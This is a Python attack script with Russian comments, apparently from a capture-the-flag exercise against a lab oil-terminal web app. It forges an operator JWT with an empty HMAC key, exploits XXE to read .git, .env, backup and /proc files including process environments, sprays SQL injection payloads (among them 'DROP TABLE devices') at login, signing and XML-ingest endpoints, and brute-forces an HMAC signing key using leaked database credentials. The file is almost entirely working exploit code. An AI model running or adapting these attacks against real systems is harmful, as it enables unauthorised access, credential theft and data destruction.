#!/usr/bin/env python3
"""round47 — SQL injection в probe/sign, .git directory, backup файлы, creative file reading"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: SQL INJECTION В /api/ops/probe/sign")
print("="*70)

sqli_devices = [
    # Базовые SQLi тесты
    "lm-01'",
    "lm-01' OR '1'='1",
    "lm-01' OR 1=1--",
    "lm-01' UNION SELECT 1--",
    "lm-01' UNION SELECT 1,2--",
    "lm-01' UNION SELECT 1,2,3--",
    "lm-01' UNION SELECT url,sig FROM probe_config--",
    "lm-01'; SELECT 1--",
    # Stacked queries
    "lm-01'; DROP TABLE devices--",
    # Error-based
    "lm-01' AND 1=CAST((SELECT 1) AS int)--",
    "lm-01' AND 1=1/0--",
    # Time-based blind
    "lm-01' AND pg_sleep(3)--",
    "lm-01' OR pg_sleep(3)--",
    "lm-01'; SELECT pg_sleep(3)--",
    # UNION с различным кол-вом столбцов
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT null,null,null,null--",
    "' UNION SELECT null,null,null,null,null--",
    # Попытка прочитать env var
    "' UNION SELECT current_setting('server_version')--",
    "' UNION SELECT current_setting('server_version'),null--",
    # Boolean-based
    "lm-01' AND 1=1--",
    "lm-01' AND 1=2--",
    # NoSQL / Object injection
    '{"$gt":""}',
    '{"device": {"$ne": ""}}',
]

baseline_time = None
for sqli in sqli_devices:
    try:
        t0 = time.time()
        r = S.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": sqli}, headers=AUTH_OP, timeout=10)
        elapsed = time.time() - t0

        if baseline_time is None and sqli == "lm-01'":
            baseline_time = elapsed

        # Ищем необычные ответы
        interesting = False
        if r.status_code == 200:
            interesting = True
            print(f"\n  [200 !!!] device={sqli[:60]}")
            print(f"    Response: {r.text[:300]}")
        elif r.status_code == 500:
            interesting = True
            print(f"\n  [500 !!!] device={sqli[:60]}")
            print(f"    Response: {r.text[:300]}")
        elif elapsed > 3:
            interesting = True
            print(f"\n  [SLOW {elapsed:.1f}s !!!] device={sqli[:60]}")
            print(f"    [{r.status_code}] {r.text[:200]}")

        if not interesting:
            # Кратко
            text = r.text[:80].replace('\n',' ')
            print(f"  [{r.status_code}] {elapsed:.2f}s | {sqli[:40]}: {text}")

    except Exception as e:
        print(f"  [ERR] {sqli[:40]}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: SQL INJECTION В /api/auth/login")
print("="*70)

sqli_logins = [
    {"email": "admin' OR 1=1--", "password": "test"},
    {"email": "admin'--", "password": "test"},
    {"email": "' UNION SELECT 1,2,3,4,5--", "password": "test"},
    {"email": "' OR 1=1--", "password": "' OR 1=1--"},
    {"email": "admin", "password": "' OR 1=1--"},
    # Time-based
    {"email": "admin' AND pg_sleep(3)--", "password": "test"},
    {"email": "admin'; SELECT pg_sleep(3)--", "password": "test"},
    # Error-based
    {"email": "admin' AND 1=CAST('a' AS int)--", "password": "test"},
]

for payload in sqli_logins:
    try:
        t0 = time.time()
        r = S.post(f"{CASPI}/api/auth/login",
            json=payload, headers={"Content-Type":"application/json"}, timeout=10)
        elapsed = time.time() - t0

        if r.status_code == 200 or r.status_code == 500 or elapsed > 3:
            print(f"\n  [{r.status_code}] {elapsed:.1f}s | email={payload['email'][:40]}:")
            print(f"    {r.text[:300]}")
        else:
            text = r.text[:80].replace('\n',' ')
            print(f"  [{r.status_code}] {elapsed:.2f}s | {payload['email'][:40]}: {text}")
    except Exception as e:
        print(f"  [ERR] {payload['email'][:30]}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: SQL INJECTION В CUSTODY/INGEST ЧЕРЕЗ XML ПОЛЯ")
print("="*70)

# tankId и product могут использоваться в SQL
sqli_fields = [
    ("tankId", "T-01' OR 1=1--"),
    ("tankId", "T-01'; SELECT pg_sleep(3)--"),
    ("product", "D' UNION SELECT 1--"),
    ("reference", "ref' OR 1=1--"),
    ("carrier", "C' UNION SELECT current_setting('server_version')--"),
]

for field, value in sqli_fields:
    xml_parts = {
        "reference": "r", "tankId": "T-01", "product": "D",
        "grossVolume": "1", "netVolume": "1",
        "density": "1", "temperature": "1",
        "carrier": "C", "remarks": "R"
    }
    xml_parts[field] = value

    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{xml_parts["reference"]}</reference>
  <tankId>{xml_parts["tankId"]}</tankId>
  <product>{xml_parts["product"]}</product>
  <grossVolume>{xml_parts["grossVolume"]}</grossVolume>
  <netVolume>{xml_parts["netVolume"]}</netVolume>
  <density>{xml_parts["density"]}</density>
  <temperature>{xml_parts["temperature"]}</temperature>
  <carrier>{xml_parts["carrier"]}</carrier>
  <remarks>{xml_parts["remarks"]}</remarks>
</ticket>'''

    try:
        t0 = time.time()
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        elapsed = time.time() - t0

        if r.status_code == 500 or elapsed > 3:
            print(f"\n  [{r.status_code}] {elapsed:.1f}s | {field}={value[:40]}:")
            print(f"    {r.text[:300]}")
        else:
            text = r.text[:100].replace('\n',' ')
            print(f"  [{r.status_code}] {elapsed:.2f}s | {field}={value[:40]}: {text}")
    except Exception as e:
        print(f"  [ERR] {field}={value[:30]}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: .GIT DIRECTORY")
print("="*70)

git_paths = [
    "/app/.git/HEAD",
    "/app/.git/config",
    "/app/.git/description",
    "/app/.git/refs/heads/master",
    "/app/.git/refs/heads/main",
    "/app/.git/COMMIT_EDITMSG",
    "/app/.git/index",
    "/app/.git/packed-refs",
    "/.git/HEAD",
    "/.git/config",
]

for fp in git_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp}:")
        print(f"    {val[:500]}")
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ/БИНАРНЫЙ] {fp}")

# Также через HTTP
for gp in ["/.git/HEAD", "/.git/config", "/app/.git/HEAD",
           "/.git/refs/heads/master", "/.git/packed-refs"]:
    try:
        r = S.get(f"{CASPI}{gp}", headers=AUTH_OP, timeout=5)
        if r.status_code == 200 and len(r.text) < 10000:
            print(f"\n  [HTTP 200] {gp}:")
            print(f"    {r.text[:500]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: BACKUP И SWAP ФАЙЛЫ")
print("="*70)

backup_paths = [
    "/app/app.py.bak", "/app/app.py.old", "/app/app.py~",
    "/app/app.py.save", "/app/app.py.orig", "/app/app.py.backup",
    "/app/app.py.1", "/app/app.py.2",
    "/app/.app.py.swp", "/app/.app.py.swo",
    "/app/auth.py.bak", "/app/auth.py.old", "/app/auth.py~",
    "/app/.auth.py.swp",
    "/app/entrypoint.sh.bak", "/app/entrypoint.sh.old",
    # Maybe config with different name
    "/app/config.py", "/app/conf.py", "/app/secret.py",
    "/app/settings.py", "/app/env.py",
    # .env variants
    "/app/.env", "/app/.env.local", "/app/.env.production",
    "/app/.env.docker", "/app/.flaskenv",
    "/.env", "/.env.local", "/.env.production",
    "/.env.docker", "/.flaskenv",
    # Docker
    "/.dockerenv",
    "/app/Dockerfile",
    "/app/docker-compose.yml",
    "/docker-compose.yml",
    "/Dockerfile",
]

for fp in backup_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp} ({len(val)} chars):")
        for line in val.split('\n')[:30]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ/БИНАРНЫЙ] {fp}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE/SIGN — DEVICE ENUM И ОШИБКИ")
print("="*70)

# Какие ошибки возвращает probe/sign для разных device?
sign_tests = [
    "",           # пустой
    "x",          # несуществующий
    "tk-04",      # отсутствующий танк
    "tk-05",
    "tk-06",
    "tk-08",
    "tk-09",
    "tk-10",
    "lm-02",
    "lm-03",
    "../../../etc/passwd",
    "lm-01\x00extra",
    "%00",
    "a" * 1000,   # длинный
    "*",
    "lm-01 OR 1=1",
    "lm-01\ttk-01",
]

for dev in sign_tests:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": dev}, headers=AUTH_OP, timeout=5)
        text = r.text[:150].replace('\n',' ')
        if r.status_code == 200:
            print(f"\n  [200!] device='{dev[:30]}': {text}")
        elif r.status_code == 500:
            print(f"\n  [500!] device='{dev[:30]}': {text}")
        else:
            print(f"  [{r.status_code}] device='{dev[:30]}': {text}")
    except Exception as e:
        print(f"  [ERR] device='{dev[:20]}': {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: PROBE_SECRET КАК СОДЕРЖИМОЕ ИЗВЕСТНЫХ ФАЙЛОВ")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Содержимое db.py как ключ? Или части?
db_url = b"postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal"
db_pw = b"terminal_web_pw"

file_contents_keys = [
    db_url,
    db_url + b"\n",
    db_pw,
    db_pw + b"\n",
    b"terminal_web",
    b"terminal_web\n",
    b"terminal",
    b"terminal\n",
    # Hostname
    b"5407f6317f5c",
    b"5407f6317f5c\n",
    # Flag hashes
    b"c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95",
    b"c8142af02727b3d7d51e4aece866104b",
    # Flag full
    b"KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}",
    b"STF{c8142af02727b3d7d51e4aece866104b}",
    # Gunicorn conf parts
    b"0.0.0.0",
    b"gthread",
    # Various
    b"gauge-gw.internal",
    b"gauge-gw.internal:9100",
    b"http://gauge-gw.internal:9100",
    b"caspi",
    b"aktau",
    b"mangystau",
    # Common env var values for secrets
    b"change-me",
    b"changeme",
    b"please-change-me",
    b"default-secret",
    b"insecure-secret",
    b"dev-secret",
    b"development",
    b"production",
    b"testing",
]

for key in file_contents_keys:
    h = hm.new(key, known_url, hashlib.sha256).hexdigest()
    if h == known_sig:
        print(f"\n  НАЙДЕН! key={key!r} <<<<<<")
        break
else:
    print("  Содержимое известных файлов не совпало")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: /proc/self/maps — ИЩЕМ ENVIRON REGION")
print("="*70)

st, val = xxe_read("/proc/self/maps")
if st == "OK":
    lines = val.split('\n')
    for line in lines:
        if '[stack]' in line or '[heap]' in line or '[vvar]' in line or \
           '[vdso]' in line or 'environ' in line.lower():
            print(f"  {line}")

    # Показываем все анонимные маппинги (rw-)
    print("\n  RW анонимные маппинги (могут содержать environ):")
    for line in lines:
        parts = line.split()
        if len(parts) >= 5 and 'rw' in parts[1] and len(parts) == 5:
            # Anonymous mapping (no file path)
            print(f"  {line}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: /proc/self/smaps_rollup")
print("="*70)

for proc_file in [
    "/proc/self/smaps_rollup",
    "/proc/self/limits",
    "/proc/self/oom_score",
    "/proc/self/oom_adj",
    "/proc/self/loginuid",
    "/proc/self/sessionid",
    "/proc/self/comm",
    "/proc/self/wchan",
    "/proc/self/personality",
    "/proc/1/comm",
    "/proc/1/wchan",
]:
    st, val = xxe_read(proc_file)
    if st == "OK" and val:
        v = val.strip()[:200]
        print(f"  {proc_file}: {v}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: CREATIVE — /proc/self/task/*/children И WORKER PIDs")
print("="*70)

# Найти все worker PIDs
st, val = xxe_read("/proc/1/task/1/children")
if st == "OK" and val:
    print(f"  Master children: {val}")
    pids = val.strip().split()
    for pid in pids[:10]:
        # Попробуем прочитать cmdline и comm каждого worker
        st2, v2 = xxe_read(f"/proc/{pid}/comm")
        if st2 == "OK":
            print(f"    PID {pid} comm: {v2.strip()}")
        # Попробуем /proc/PID/environ (всё равно BIN, но вдруг)
        st3, v3 = xxe_read(f"/proc/{pid}/environ")
        if st3 == "OK" and v3:
            print(f"    PID {pid} environ: {v3[:200]}")
        elif st3 == "BIN":
            pass  # Expected

print("\n"+"="*70)
print("DONE")
print("="*70)
